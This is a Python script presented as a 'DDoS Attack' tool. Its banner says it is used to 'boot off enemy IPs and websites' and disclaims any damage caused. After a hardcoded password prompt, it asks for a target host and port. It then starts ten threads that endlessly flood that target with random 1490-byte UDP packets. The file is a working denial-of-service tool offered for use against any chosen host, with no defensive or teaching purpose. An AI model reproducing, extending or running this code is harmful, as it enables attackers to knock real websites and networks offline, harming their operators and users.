#!/usr/bin/python3
# This code write by (rekt)
# DDos Attack v1.0.0
import os
try:
    from colorama import Fore, init
    init()
except ImportError:
    os.system("pip3 install colorama")
import time
import sys
import socket
import threading
import platform
import random
import subprocess
system = platform.uname()[0]
def clear():
    os.system('cls' if system == 'Windows' else 'clear')

def ascii_animation():
    clear()  # Clear the console (if you still want to clear it before showing anything else)
    print(f'''
     / **/|
     | == /
      |  |
      |  |
      |  /
       |/







    ''')
    time.sleep(0.6)
    clear()
    print(f'''



     / **/|
     | == /
      |  |
      |  |
      |  /
       |/


    ''')
    time.sleep(0.6)
    clear()
    print(f'''







     / **/|
     | == /
      |  |

    ''')
    time.sleep(0.6)
    clear()
    print(f"""

     _.-^^---....,,--
 _--                  --_
<                        >)
|                         |
 \._                   _./
    ```--. . , ; .--'''
          | |   |
       .-=||  | |=-.
       `-=#$%&%$#=-'
          | ;  :|
 _____.,-#%&$@%#&#~,._____
    """)
    time.sleep(0.8)
    clear()
# Define a password
PASSWORD = "REKTY"  # Change this to your desired password
1
def title():
    if system == 'Linux':
        os.system("printf '\033]2;DDos-Attack\a'")
    elif system == 'Windows':
        os.system("title Rektic DDoS Tool")
    else:
        print("\nPlease, Run This program on Linux, Windows, or MacOS!\n")
        sys.exit()

def cls():
    if system == 'Windows':
        os.system("cls")
    elif system == 'Linux':
        os.system("clear")
    else:
        print("\nPlease, Run This program on Linux, Windows, or MacOS!\n")
        sys.exit()

class color:
    red = '\033[91m'
    green = '\033[92m'
    End = '\033[0m'
    blue = '\033[33m'

def menu():
    title()
    cls()
    print("""
            [Welcome To The DDoS Tool Used By Rektic Soldiers To Boot Off Enemy IPs And Websites.]
            [Take Note That Any Damage You Cause With This Tool Is None Of Our Business To Deal With.]
                                            [Happy Dossing!]
                                          [Made With Courage By Rekt]

  _____       ______       _  __      _______      __     __         _____       _____        ____        _____ 
 |  __ \     |  ____|     | |/ /     |__   __|     \ \   / /        |  __ \     |  __ \      / __ \      / ____|
 | |__) |    | |__        | ' /         | |         \ \_/ /         | |  | |    | |  | |    | |  | |    | (___  
 |  _  /     |  __|       |  <          | |          \   /          | |  | |    | |  | |    | |  | |     \___ \ 
 | | \ \     | |____      | . \         | |           | |           | |__| |    | |__| |    | |__| |     ____) |
 |_|  \_\    |______|     |_|\_\        |_|           |_|           |_____/     |_____/      \____/     |_____/ 
                                                                                                                
                                                                                                                
""")


    # Password protection
    user_password = input('''\x1b[38;2;0;212;14m╔══[💀Enter \x1b[38;2;0;186;45mPassword \x1b[38;2;0;150;88mto \x1b[38;2;0;113;133mContinue\x1b[38;2;0;49;147m💀]
\x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤ \x1b[38;2;239;239;239m \033[38;5;51m''')
    if user_password != PASSWORD:
        print("Incorrrect. Exiting Program...")
        sys.exit()

   



   
    host = input('''\x1b[38;2;0;212;14m╔══[Enter \x1b[38;2;0;186;45mHOST-name \x1b[38;2;0;150;88mor \x1b[38;2;0;113;133mIP \x1b[38;2;0;49;147m]
\x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤ \x1b[38;2;239;239;239m \33[38;5;46m''')
    time.sleep(1)
    port = int(input('''\x1b[38;2;0;212;14m╔══[Enter \x1b[38;2;0;186;45mTarget \x1b[38;2;0;150;88mactive \x1b[38;2;0;113;133mPort \x1b[38;2;0;49;147m]
\x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤ \x1b[38;2;239;239;239m \033[38;5;196m'''))
    ##################################################
    UDP_PORT = port
    bs = random._urandom(1490)
    time.sleep(1)
    cls()
    ip = socket.gethostbyname(host)
    print(color.red + "=============================================================================\n" + color.End)
    print("\033[38;5;196mYourTarget IP:", ip)
    time.sleep(1)
    print("\033[38;5;226mTarget port:", UDP_PORT)
    print(color.red + "=============================================================================\n" + color.End)
    time.sleep(2)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def run(k):
        while True:
            sock.sendto(bs, (ip, port))
            print(f'''[KABOOMING TARGET..]''')

    for i in range(10):
        ch = threading.Thread(target=run, args=[i])
        ch.start()

if __name__ == '__main__':
    try:
        try:
            menu()
        except EOFError:
            print("\nCtrl + D")
            print("\nExiting...")
            sys.exit()
    except KeyboardInterrupt:
        print("\nCtrl + C")
        print("\nExiting...")
        sys.exit()
# Thanks For using :)
